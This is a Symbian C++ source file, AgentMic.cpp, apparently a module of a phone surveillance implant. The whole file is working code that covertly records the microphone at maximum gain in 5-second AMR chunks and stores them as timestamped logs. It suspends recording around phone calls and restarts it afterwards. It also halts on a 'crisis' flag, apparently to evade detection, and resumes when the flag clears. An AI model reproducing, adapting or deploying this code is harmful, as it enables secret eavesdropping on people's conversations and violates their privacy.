/*
 * AgentMic.cpp
 *
 *  Created on: 29/ago/2010
 *      Author: Giovanna
 */

/*
 * This code is based on:
 * S60 Platform: Audio Streaming Example v2.1 
 * http://www.forum.nokia.com/info/sw.nokia.com/id/4ed27119-e08e-480e-b0b8-aeb48fe5c5e8/S60_Platform_Audio_Streaming_Example_v2_1_en.zip.html
 * Another example from SDK docs:
 * http://library.forum.nokia.com/index.jsp?topic=/S60_5th_Edition_Cpp_Developers_Library/GUID-441D327D-D737-42A2-BCEA-FE89FBCA2F35/AudioStreamExample/doc/a_audio_stream_engine_8cpp-source.html
 * and explanations from:
 * SymbianOS C++ for Mobile Phones, vol. 2, Programming with Extended Functionality and Advanced Features, Richard Harrison (Wiley)
 */
#include "AgentMic.h"
#include <HT\LogFile.h>
#include <HT\TimeUtils.h>
#include "AgentCrisis.h"

// Audio data buffer size for AMR encoding (20 ms per frame, a total of 5000 ms in 250 frames).
// http://wiki.forum.nokia.com/index.php/AMR_format
const TInt KFrameSizeAMR = 32; 
const TInt KFrameCountAMR = 250;
const TInt KBufferSize = KFrameSizeAMR * KFrameCountAMR;
// Number of buffers used 
const TInt KStreamBufferCount = 2;



CAgentMic::CAgentMic() :
	CAbstractAgent(EAgent_Mic),iFramesCounter(0)
	{
	// No implementation required
	}

CAgentMic::~CAgentMic()
	{
	delete iCallMonitor;
	delete iTimer;
	delete iCrisisMonitor;
	
	__FLOG(_L("Destructor"));
	if(iInputStream)
	    {
	    iInputStream->Stop();
	    delete iInputStream;
	    }

	if(iRecData)
		{
		delete iRecData;
		}
	 
	iStreamBufferArray.ResetAndDestroy();
	
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentMic* CAgentMic::NewLC(const TDesC8& params)
	{
	CAgentMic* self = new (ELeave) CAgentMic();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentMic* CAgentMic::NewL(const TDesC8& params)
	{
	CAgentMic* self = CAgentMic::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentMic::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN("HT", "Agent_Mic.txt");
	__FLOG(_L("-------------"));
		
	BaseConstructL(params);
	
	iCallMonitor = CSlimPhoneCallMonitor::NewL(*this);
	iTimer = CTimeOutTimer::NewL(*this);
	iCrisisMonitor = CMonitorCrisis::NewL(EMicCrisis,*this);
		
	// Initial audio stream properties for input and output, 8KHz mono. 
	// These settings could also be set/changed using method SetAudioPropertiesL() of
	// the input and output streams.
	iStreamSettings.iChannels=TMdaAudioDataSettings::EChannelsMono;
	iStreamSettings.iSampleRate=TMdaAudioDataSettings::ESampleRate8000Hz;
	// set default encoding
	iDefaultEncoding = KMMFFourCCCodeAMR; 
	// construct stream
	// priorities will be ignored if the capability MultimediaDD isn't provided,
	// priority taken from mmfbase.h
    iInputStream = CMdaAudioInputStream::NewL(*this,EMdaPriorityMax,EMdaPriorityPreferenceTime);
		    			
    // stream buffers allocation
    TDes8* buffer;
    for (TInt idx=0; idx<KStreamBufferCount; idx++)
    	{
			buffer = new(ELeave) TBuf8<KFrameSizeAMR>;
			CleanupStack::PushL(buffer);        
			iStreamBufferArray.Append(buffer);        
			CleanupStack::Pop(buffer);        
    	}
	}

void CAgentMic::StartAgentCmdL()
	{
	//__FLOG(_L("StartAgentCmdL()"));
	
	iCallMonitor->StartListeningForEvents();
	iCrisisMonitor->Start();
	
	// if we are in crisis don't go further
	// see AgentCrisis.h for mask values
	TInt flags=0;
	iCrisis = EFalse;
	RProperty::Get(KPropertyUidCore, KPropertyCrisis,flags);
	if(flags & ECamCrisis)
		iCrisis = ETrue;
		
	TTime now;
	now.UniversalTime();
	TInt64 filetime = TimeUtils::GetFiletime(now);
	iMicAdditionalData.highDateTime = (filetime >> 32);
	iMicAdditionalData.lowDateTime = (filetime & 0xFFFFFFFF);
	
	if(iInputStream)
	    {
		iInputStream->Stop();
		delete iInputStream;
		iInputStream = NULL;
		}
		
	// priorities will be ignored if the capability MultimediaDD isn't provided
	iInputStream = CMdaAudioInputStream::NewL(*this,EMdaPriorityMax,EMdaPriorityPreferenceTime);
		    
	// Open input stream.
	// Upon completion will receive callback in 
	// MMdaAudioInputStreamCallback::MaiscOpenComplete().
	iInputStream->Open(&iStreamSettings);
	    
	}

void CAgentMic::StopAgentCmdL()
	{
	//__FLOG(_L("StopAgentCmdL()"));
	
	iTimer->Cancel();
	iCallMonitor->Cancel();
	iCrisisMonitor->Cancel();
	
	if(iInputStream)
		{
		iInputStream->Stop();
		}
	
	}
void CAgentMic::CycleAgentCmdL()
	{
	//nothing to be done, this is not an appending agent
	}


/*
 * MMdaAudioInputStream callbacks (MMdaAudioInputStreamCallback)
 *
 * CAgentMic::MaiscOpenComplete(
 *     TInt aError)
 *
 * called upon completion of CMdaAudioInputStream::Open(),
 *  if the stream was opened succesfully (aError==KErrNone), it's ready for use.
 *  upon succesful open, the first audio data block will be read from the input
 *  stream.
 */
void CAgentMic::MaiscOpenComplete(TInt aError)
    {
	if (aError==KErrNone) 
        {
		if(iRecData)
			{
			delete iRecData;
			iRecData = NULL;
			}
		iRecData = HBufC8::NewL(KBufferSize);
			
		iFramesCounter = 0;
			
		// Set the data type (encoding)
        TRAPD(error, iInputStream->SetDataTypeL(iDefaultEncoding));

        // set stream input gain to maximum
        iInputStream->SetGain(iInputStream->MaxGain());
        iInputStream->SetPriority(EMdaPriorityMax,EMdaPriorityPreferenceTime);
        
        // two buffers are used, they will be used in a internal FIFO queue
        if(!iCrisis)
        	{
        	iInputStream->ReadL(*iStreamBufferArray[0]);
        	iInputStream->ReadL(*iStreamBufferArray[1]);
        	}
        } 
	else
		{
		//TODO: retry if error?
		}
    }

/*
 * CAgentMic::MaiscBufferCopied(
 *      TInt aError, const TDesC8& aBuffer)
 *      
 *      called when a block of audio data has been read and is available at the 
 *      buffer reference *aBuffer.  calls to ReadL() will be issued until all blocks
 *      in the audio data buffer (iStreamBuffer) are filled.
 */

// NOTE: In 2nd Edition we MUST NOT call iInputStream->Stop() here, because
// this will cause a crash on 2nd Edition, FP1 devices.
// Since iInputStream->Stop() is not called, the callback method
// MaiscRecordComplete() will not be called either after exiting this method.
// In 3rd Edition, however, iInputStream->Stop() MUST be called in order to reach
// MaiscRecordComplete(), otherwise the stream will "hang".
// It appears that in 3.2 also calling Stop() here causes crash.
// Instead we let MMF to detect that buffer becomes full. It will
// then call MaiscRecordComplete() with status KErrOverflow.
// Input stream will be stopped there.

void CAgentMic::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
    {
		
	if (aError==KErrNone && iInputStream) 
	    {
			if (&aBuffer==iStreamBufferArray[0])
		        iInputStream->ReadL(*iStreamBufferArray[0]);
		    else
		    	iInputStream->ReadL(*iStreamBufferArray[1]);
		if(aBuffer.Length())
			{
			iRecData->Des().Append(aBuffer);
			iFramesCounter++;
			if(iFramesCounter == KFrameCountAMR)
				{
				// 5 sec has been recorded, save log...
				TInt value;
				RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
				if(value)
					{
					CLogFile* logFile = CLogFile::NewLC(iFs);
					logFile->CreateLogL(LOGTYPE_MIC, &iMicAdditionalData);
					logFile->AppendLogL(*iRecData);
					logFile->CloseLogL();
					CleanupStack::PopAndDestroy(logFile);
					}
				// ...reset buffer and counter
				iRecData->Des().Zero();
				iFramesCounter = 0;
				}
		    }
		}
	else if(aError == KErrAbort)
		{
		if(aBuffer.Length())
			{
			iRecData->Des().Append(aBuffer);
			TInt value;
			RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
			if(value)
				{
				CLogFile* logFile = CLogFile::NewLC(iFs);
				logFile->CreateLogL(LOGTYPE_MIC, &iMicAdditionalData);
				logFile->AppendLogL(*iRecData);
				logFile->CloseLogL();
				CleanupStack::PopAndDestroy(logFile);
				}
			iRecData->Des().Zero();
			iFramesCounter = 0;
			}
		}
    }


/*
 * 
 * CAgentMic::MaiscRecordComplete(
 *      TInt aError)
 *      
 *      called when input stream is closed by CMdaAudioInputStream::Stop()
 *      jo: well, that's not true, it's called also when an error condition arises....
 *      
 */
void CAgentMic::MaiscRecordComplete(TInt aError)
    {
	
	if (aError == KErrNone) 
        {
		// this seems never be the case.....
        // normal stream closure after a stop and maiscbuffercopied
		}
    else if(aError == KErrCancel || aError == KErrAbort)
    	{
		// TODO: user selected stop
    	}
    else if(aError == KErrDied)  //KErrDied = -13
    	{
    	//DevSound resource conflict, call is ongoing or native rec app has been opened
    	//we have to stop and restart everything
    	iInputStream->Stop();
    	}
    else //KErrUnderflow, KErrOverflow, KErrAccessDenied, 
        {
    	iInputStream->Stop();
        } 
    }


void CAgentMic::NotifyIdle()
	{
	iCall = EFalse;
	//here we can try to restart mic recording
	if(iInputStream)
		{
		TTime time;
		TTimeIntervalSeconds seconds=2;
		time.HomeTime();
		time += seconds;        
		iTimer->CustomAt(time);
		}
	}

void CAgentMic::NotifyDialling()
	{
	iCall = ETrue;
	//this phone is calling other party
	if(iInputStream)
		{
		iInputStream->Stop(); //after stop, MaiscBufferCopied will be called  with KErrAbort
		}
	}

void CAgentMic::NotifyRinging()
	{
	iCall = ETrue;
	//this phone ringing
	if(iInputStream)
		{
		iInputStream->Stop(); //after stop, MaiscBufferCopied will be called  with KErrAbort
		}
	}


void CAgentMic::TimerExpiredL(TAny* src)
	{
	RestartRecording();
	}

void CAgentMic::RestartRecording()
	{
	if(!iCrisis)
		{
		// set start time
		TTime now;
		now.UniversalTime();
		TInt64 filetime = TimeUtils::GetFiletime(now);
		iMicAdditionalData.highDateTime = (filetime >> 32);
		iMicAdditionalData.lowDateTime = (filetime & 0xFFFFFFFF);
		// start rec
		iInputStream->ReadL(*iStreamBufferArray[0]);
		iInputStream->ReadL(*iStreamBufferArray[1]);
		}
	}

void CAgentMic::CrisisOnL()
	{
	if(!iCrisis)
		{
		// we weren't in crisis, so let's stop
		if(iInputStream)
			{
			iInputStream->Stop();
			}
		}
	iCrisis = ETrue;
	}

void CAgentMic::CrisisOffL()
	{
	if(iCrisis  && !iCall)
		{
		// we were in crisis, let's start again
		// set start time
		TTime now;
		now.UniversalTime();
		TInt64 filetime = TimeUtils::GetFiletime(now);
		iMicAdditionalData.highDateTime = (filetime >> 32);
		iMicAdditionalData.lowDateTime = (filetime & 0xFFFFFFFF);
		// start rec
		iInputStream->ReadL(*iStreamBufferArray[0]);
		iInputStream->ReadL(*iStreamBufferArray[1]);
		}
	iCrisis = EFalse;
	}

